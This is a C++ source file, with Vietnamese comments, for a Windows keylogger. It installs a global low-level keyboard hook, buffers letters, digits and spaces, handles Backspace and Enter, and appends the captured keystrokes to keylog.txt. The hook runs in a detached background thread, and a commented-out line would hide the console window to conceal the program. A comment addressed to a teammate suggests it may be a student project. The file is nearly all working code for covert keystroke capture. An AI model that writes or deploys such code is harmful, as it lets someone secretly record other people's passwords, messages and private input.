#include "Keylogger.h"
#include <iostream>
#include <string>
#include <vector>

using namespace std;

HHOOK hHook = NULL;

string lineBuffer = "";

void FlushBufferToFile() {
    if (lineBuffer.empty()) return;

    ofstream logFile;
    logFile.open("keylog.txt", ios::app);

    if (logFile.is_open()) {
        logFile << lineBuffer;
        logFile.close();
    }
    lineBuffer = "";
}

void WriteSpecialChar(string s) {
    ofstream logFile;
    logFile.open("keylog.txt", ios::app);
    if (logFile.is_open()) {
        logFile << s;
        logFile.close();
    }
}

LRESULT CALLBACK MyKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD keyCode = kbdStruct->vkCode;

        // 1. XỬ LÝ PHÍM ENTER (Xuống dòng)
        if (keyCode == VK_RETURN) {
            FlushBufferToFile();
            WriteSpecialChar("\n");
        }
        // 2. XỬ LÝ PHÍM BACKSPACE (Xóa ký tự)
        else if (keyCode == VK_BACK) {
            if (!lineBuffer.empty()) {
                lineBuffer.pop_back();
            }
        }
        // 3. XỬ LÝ PHÍM SPACE (Dấu cách)
        else if (keyCode == VK_SPACE) {
            lineBuffer += " ";
        }
        // 4. XỬ LÝ CÁC PHÍM SỐ VÀ CHỮ CÁI
        else if ((keyCode >= 0x30 && keyCode <= 0x39) || (keyCode >= 0x41 && keyCode <= 0x5A)) {
            lineBuffer += char(keyCode);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void KeyloggerLoop() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, MyKeyboardProc, NULL, 0);
    if (hHook == NULL) return;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
}

void StartKeyloggerSystem() {
	//Bỏ comment dòng dưới để ẩn cửa sổ console xuống nền.
    //ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::thread keyloggerThread(KeyloggerLoop);
    keyloggerThread.detach();
}

// Hàm dừng Keylogger
void StopKeyloggerSystem() {
    // Vô hiệu hóa Hook
    // Đây là phần khó nhất: Keylogger đang chạy trong luồng bị Detach, 
    // nên việc Unhook sẽ không thể hoàn hảo nếu không có Handle của luồng đó.
    if (hHook != NULL) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
        cout << "[STOP] Keylogger unhooked successfully." << endl;
    }
    // Logic của bạn A nên dùng hàm này để gỡ hook
}